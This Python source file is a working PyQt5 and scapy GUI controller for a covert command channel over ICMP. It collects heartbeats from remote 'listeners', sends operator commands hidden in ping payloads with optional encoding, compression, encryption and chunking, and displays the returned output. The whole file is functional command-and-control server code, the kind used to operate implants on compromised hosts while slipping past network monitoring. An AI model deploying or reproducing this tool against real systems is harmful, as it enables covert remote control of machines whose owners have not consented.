#!/usr/bin/env python3
"""
ICMP Command Server with GUI and Interface Selection
"""
import sys
import time
import threading
from collections import defaultdict
import base64
import zlib
from cryptography.fernet import Fernet

from scapy.all import IP, ICMP, Raw, sniff, send
from scapy.all import get_if_list
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QTextEdit, QLineEdit, QPushButton, 
                             QLabel, QComboBox, QSpinBox, QCheckBox, QListWidget,
                             QSplitter, QGroupBox, QStatusBar, QMessageBox,
                             QFormLayout, QFrame)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QTextCursor, QColor, QPalette

# Default configuration
DEFAULT_ICMP_ID = 13170
DEFAULT_TTL = 64
DEFAULT_CHUNK_SIZE = 500

class SnifferWorker(QThread):
    packet_received = pyqtSignal(str, str)  # Signal with IP and data
    
    def __init__(self, interface, icmp_id, parent=None):
        super().__init__(parent)
        self.interface = interface
        self.icmp_id = icmp_id
        self.running = True
        
    def run(self):
        try:
            sniff(iface=self.interface, prn=self.process_packet, 
                  filter="icmp", store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            self.packet_received.emit("ERROR", f"Sniffer error: {e}")
            
    def process_packet(self, pkt):
        try:
            if not (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
                return
                
            if pkt[ICMP].id != self.icmp_id:
                return
                
            src_ip = pkt[IP].src
            raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Handle heartbeats
            if pkt[ICMP].type == 8 and raw_data.startswith("HEARTBEAT"):
                self.packet_received.emit(src_ip, "HEARTBEAT")
                return
                
            # Handle command responses
            if pkt[ICMP].type == 0:
                self.packet_received.emit(src_ip, raw_data)
                    
        except Exception as e:
            self.packet_received.emit("ERROR", f"Packet processing error: {e}")
        
    def stop(self):
        self.running = False

class CommandServerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.sequence_num = 0
        self.connected_listeners = {}
        self.running = True
        self.encryption_enabled = False
        self.cipher = None
        self.sniffer_worker = None
        self.args = None
        self.selected_listener = None
        
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("ICMP Command Server")
        self.setGeometry(100, 100, 900, 700)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        
        # Configuration group
        config_group = QGroupBox("Server Configuration")
        config_layout = QFormLayout()
        
        # Network interface selection
        self.interface_combo = QComboBox()
        interfaces = get_if_list()
        for iface in interfaces:
            self.interface_combo.addItem(iface)
        config_layout.addRow("Network Interface:", self.interface_combo)
        
        # ICMP ID
        self.icmp_id_spin = QSpinBox()
        self.icmp_id_spin.setRange(1, 65535)
        self.icmp_id_spin.setValue(DEFAULT_ICMP_ID)
        config_layout.addRow("ICMP ID:", self.icmp_id_spin)
        
        # TTL
        self.ttl_spin = QSpinBox()
        self.ttl_spin.setRange(1, 255)
        self.ttl_spin.setValue(DEFAULT_TTL)
        config_layout.addRow("TTL:", self.ttl_spin)
        
        # Encoding
        self.encoding_combo = QComboBox()
        self.encoding_combo.addItems(['plain', 'base64', 'hex'])
        config_layout.addRow("Encoding:", self.encoding_combo)
        
        # Compression
        self.compress_check = QCheckBox()
        config_layout.addRow("Compression:", self.compress_check)
        
        # Encryption
        self.encrypt_check = QCheckBox()
        self.encrypt_check.stateChanged.connect(self.toggle_encryption_fields)
        config_layout.addRow("Encryption:", self.encrypt_check)
        
        # Encryption key
        self.key_edit = QLineEdit()
        self.key_edit.setPlaceholderText("Enter encryption key")
        self.key_edit.setEnabled(False)
        config_layout.addRow("Encryption Key:", self.key_edit)
        
        # Chunk size
        self.chunk_size_spin = QSpinBox()
        self.chunk_size_spin.setRange(100, 1500)
        self.chunk_size_spin.setValue(DEFAULT_CHUNK_SIZE)
        config_layout.addRow("Chunk Size:", self.chunk_size_spin)
        
        # Start button
        self.start_btn = QPushButton("Start Server")
        self.start_btn.clicked.connect(self.start_server)
        config_layout.addRow("", self.start_btn)
        
        config_group.setLayout(config_layout)
        main_layout.addWidget(config_group)
        
        # Splitter for listeners and output
        self.splitter = QSplitter(Qt.Horizontal)
        self.splitter.setVisible(False)  # Hide until server starts
        
        # Listeners panel
        listeners_widget = QWidget()
        listeners_layout = QVBoxLayout(listeners_widget)
        
        # Selected listener indicator
        self.selected_label = QLabel("No listener selected")
        self.selected_label.setStyleSheet("QLabel { background-color: #f0f0f0; padding: 5px; border: 1px solid #ccc; }")
        self.selected_label.setAlignment(Qt.AlignCenter)
        listeners_layout.addWidget(self.selected_label)
        
        listeners_layout.addWidget(QLabel("Connected Listeners:"))
        self.listeners_list = QListWidget()
        self.listeners_list.setSelectionMode(QListWidget.SingleSelection)
        self.listeners_list.itemSelectionChanged.connect(self.on_listener_selected)
        listeners_layout.addWidget(self.listeners_list)
        
        # Listener control buttons
        listener_btn_layout = QHBoxLayout()
        self.select_btn = QPushButton("Select")
        self.select_btn.clicked.connect(self.select_listener)
        self.select_btn.setEnabled(False)
        listener_btn_layout.addWidget(self.select_btn)
        
        self.deselect_btn = QPushButton("Deselect")
        self.deselect_btn.clicked.connect(self.deselect_listener)
        self.deselect_btn.setEnabled(False)
        listener_btn_layout.addWidget(self.deselect_btn)
        
        listeners_layout.addLayout(listener_btn_layout)
        
        self.refresh_listeners_btn = QPushButton("Refresh Listeners")
        self.refresh_listeners_btn.clicked.connect(self.refresh_listeners)
        listeners_layout.addWidget(self.refresh_listeners_btn)
        
        self.splitter.addWidget(listeners_widget)
        
        # Output panel
        output_widget = QWidget()
        output_layout = QVBoxLayout(output_widget)
        
        output_layout.addWidget(QLabel("Command Output:"))
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 10))
        output_layout.addWidget(self.output_text)
        
        # Command input
        command_layout = QHBoxLayout()
        command_layout.addWidget(QLabel("Command:"))
        self.command_input = QLineEdit()
        self.command_input.returnPressed.connect(self.send_command)
        self.command_input.setEnabled(False)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = QPushButton("Send")
        self.send_btn.clicked.connect(self.send_command)
        self.send_btn.setEnabled(False)
        command_layout.addWidget(self.send_btn)
        
        output_layout.addLayout(command_layout)
        self.splitter.addWidget(output_widget)
        
        self.splitter.setSizes([250, 650])
        main_layout.addWidget(self.splitter, 1)
        
        # Status bar
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage("Select interface and configure server")
        
        # Timer to update listeners list
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_listeners)
        
    def toggle_encryption_fields(self, state):
        """Enable/disable encryption key field based on checkbox state"""
        self.key_edit.setEnabled(state == Qt.Checked)
        
    def on_listener_selected(self):
        """Handle listener selection changes"""
        selected_items = self.listeners_list.selectedItems()
        self.select_btn.setEnabled(len(selected_items) > 0)
        
    def select_listener(self):
        """Select the currently highlighted listener"""
        selected_items = self.listeners_list.selectedItems()
        if selected_items:
            self.selected_listener = selected_items[0].text()
            self.selected_label.setText(f"Selected: {self.selected_listener}")
            self.selected_label.setStyleSheet("QLabel { background-color: #d4edda; padding: 5px; border: 1px solid #c3e6cb; color: #155724; }")
            self.deselect_btn.setEnabled(True)
            self.send_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            
    def deselect_listener(self):
        """Deselect the current listener"""
        self.selected_listener = None
        self.selected_label.setText("No listener selected")
        self.selected_label.setStyleSheet("QLabel { background-color: #f0f0f0; padding: 5px; border: 1px solid #ccc; }")
        self.deselect_btn.setEnabled(False)
        self.send_btn.setEnabled(False)
        self.command_input.setEnabled(False)
        self.listeners_list.clearSelection()
        
    def start_server(self):
        """Start the ICMP server with the selected configuration"""
        # Get configuration from UI
        interface = self.interface_combo.currentText()
        icmp_id = self.icmp_id_spin.value()
        ttl = self.ttl_spin.value()
        encoding = self.encoding_combo.currentText()
        compress = self.compress_check.isChecked()
        encrypt = self.encrypt_check.isChecked()
        key = self.key_edit.text() if encrypt else None
        chunk_size = self.chunk_size_spin.value()
        
        # Validate encryption
        if encrypt and not key:
            QMessageBox.warning(self, "Configuration Error", 
                               "Encryption requires a key")
            return
            
        # Store configuration
        self.args = type('Args', (), {
            'interface': interface,
            'icmp_id': icmp_id,
            'ttl': ttl,
            'encoding': encoding,
            'compress': compress,
            'encrypt': encrypt,
            'key': key,
            'chunk_size': chunk_size
        })()
        
        # Setup encryption if enabled
        if encrypt and key:
            try:
                self.cipher = Fernet(key.encode())
                self.encryption_enabled = True
            except:
                QMessageBox.warning(self, "Encryption Error", "Invalid encryption key")
                return
        
        # Disable configuration controls
        self.interface_combo.setEnabled(False)
        self.icmp_id_spin.setEnabled(False)
        self.ttl_spin.setEnabled(False)
        self.encoding_combo.setEnabled(False)
        self.compress_check.setEnabled(False)
        self.encrypt_check.setEnabled(False)
        self.key_edit.setEnabled(False)
        self.chunk_size_spin.setEnabled(False)
        self.start_btn.setEnabled(False)
        
        # Show the output area
        self.splitter.setVisible(True)
        
        # Start the server
        self.start_sniffer()
        
        # Update status
        self.statusBar.showMessage(f"Server started on {interface}")
        self.output_text.append(f"[+] ICMP Command Server started on {interface}")
        self.output_text.append(f"[+] ICMP ID: {icmp_id}")
        self.output_text.append(f"[+] Encoding: {encoding}")
        self.output_text.append(f"[+] Compression: {'Enabled' if compress else 'Disabled'}")
        self.output_text.append(f"[+] Encryption: {'Enabled' if self.encryption_enabled else 'Disabled'}")
        self.output_text.append(f"[+] Chunk size: {chunk_size} bytes")
        self.output_text.append("\n[+] Click on a listener and press 'Select' to target commands")
        
    def start_sniffer(self):
        """Start sniffing for ICMP packets"""
        self.sniffer_worker = SnifferWorker(self.args.interface, self.args.icmp_id)
        self.sniffer_worker.packet_received.connect(self.process_packet)
        self.sniffer_worker.start()
        
        self.statusBar.showMessage(f"Sniffing on {self.args.interface}...")
        self.update_timer.start(5000)  # Update every 5 seconds
        
    def encrypt_data(self, data):
        """Encrypt data if enabled"""
        if self.encryption_enabled and self.cipher:
            return self.cipher.encrypt(data.encode()).decode('latin-1')
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if enabled"""
        if self.encryption_enabled and self.cipher:
            try:
                return self.cipher.decrypt(data.encode('latin-1')).decode()
            except:
                return f"[DECRYPTION_ERROR] {data}"
        return data
    
    def encode_data(self, data):
        """Encode data based on selected method"""
        if self.args.encoding == "base64":
            data = base64.b64encode(data.encode()).decode()
        elif self.args.encoding == "hex":
            data = data.encode().hex()
        
        if self.args.compress:
            data = base64.b64encode(zlib.compress(data.encode())).decode()
        
        return data
    
    def decode_data(self, data):
        """Decode data based on selected method"""
        if self.args.compress:
            try:
                data = zlib.decompress(base64.b64decode(data)).decode()
            except:
                pass
        
        if self.args.encoding == "base64":
            data = base64.b64decode(data).decode(errors='ignore')
        elif self.args.encoding == "hex":
            data = bytes.fromhex(data).decode(errors='ignore')
        
        return data
    
    def send_command(self):
        """Send a command to the selected listener"""
        if not self.args:
            QMessageBox.warning(self, "Server Not Started", "Please start the server first")
            return
            
        if not self.selected_listener:
            QMessageBox.warning(self, "No Target", "Please select a listener first")
            return
            
        command = self.command_input.text().strip()
        if not command:
            return
            
        try:
            # Encode and encrypt the command
            encoded_cmd = self.encode_data(command)
            encrypted_cmd = self.encrypt_data(encoded_cmd)
            
            # Split into chunks if needed
            chunks = [encrypted_cmd[i:i+self.args.chunk_size] 
                     for i in range(0, len(encrypted_cmd), self.args.chunk_size)]
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                payload = (IP(dst=self.selected_listener, ttl=self.args.ttl)/
                          ICMP(type=8, id=self.args.icmp_id, seq=self.sequence_num)/
                          Raw(load=f"{i}:{len(chunks)}:{chunk}"))
                
                send(payload, verbose=0)
                self.sequence_num = (self.sequence_num + 1) % 65535
                time.sleep(0.1)
            
            self.statusBar.showMessage(f"Command sent to {self.selected_listener}")
            self.command_input.clear()
            self.output_text.append(f"\n[+] Sent command to {self.selected_listener}: {command}")
            
        except Exception as e:
            self.output_text.append(f"[-] Error sending command: {e}")
    
    def process_packet(self, src_ip, raw_data):
        """Process incoming ICMP packets"""
        try:
            if src_ip == "ERROR":
                self.output_text.append(raw_data)
                return
                
            # Handle heartbeats
            if raw_data == "HEARTBEAT":
                self.connected_listeners[src_ip] = time.time()
                self.output_text.append(f"[+] Heartbeat from {src_ip}")
                self.update_listeners()
                return
                
            # Handle command responses
            if src_ip in self.connected_listeners:
                try:
                    # Handle chunked responses
                    if ':' in raw_data:
                        parts = raw_data.split(':', 2)
                        if len(parts) == 3:
                            chunk_num, total_chunks, data = parts
                            # For simplicity, just print each chunk
                            decrypted_data = self.decrypt_data(data)
                            decoded_data = self.decode_data(decrypted_data)
                            self.output_text.insertPlainText(decoded_data)
                            # Auto-scroll to bottom
                            cursor = self.output_text.textCursor()
                            cursor.movePosition(QTextCursor.End)
                            self.output_text.setTextCursor(cursor)
                    else:
                        decrypted_data = self.decrypt_data(raw_data)
                        decoded_data = self.decode_data(decrypted_data)
                        self.output_text.append(decoded_data)
                except Exception as e:
                    self.output_text.append(f"[-] Error processing response: {e}")
                    
        except Exception as e:
            self.output_text.append(f"[-] Error processing packet: {e}")

    def cleanup_listeners(self):
        """Remove old listeners"""
        current_time = time.time()
        for ip in list(self.connected_listeners.keys()):
            if current_time - self.connected_listeners[ip] > 30:
                del self.connected_listeners[ip]
                self.output_text.append(f"[-] Listener {ip} timed out")
                # If the timed out listener was selected, deselect it
                if self.selected_listener == ip:
                    self.deselect_listener()

    def refresh_listeners(self):
        """Refresh the listeners list"""
        self.cleanup_listeners()
        self.update_listeners()
        
    def update_listeners(self):
        """Update the listeners list widget"""
        self.cleanup_listeners()
        current_items = [self.listeners_list.item(i).text() for i in range(self.listeners_list.count())]
        new_listeners = list(self.connected_listeners.keys())
        
        # Only update if the list has changed
        if set(current_items) != set(new_listeners):
            self.listeners_list.clear()
            for ip in new_listeners:
                self.listeners_list.addItem(ip)
        
    def closeEvent(self, event):
        """Handle application close"""
        if self.sniffer_worker:
            self.sniffer_worker.stop()
            self.sniffer_worker.wait(1000)
            
        if self.update_timer:
            self.update_timer.stop()
            
        event.accept()

def main():
    app = QApplication(sys.argv)
    server_gui = CommandServerGUI()
    server_gui.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
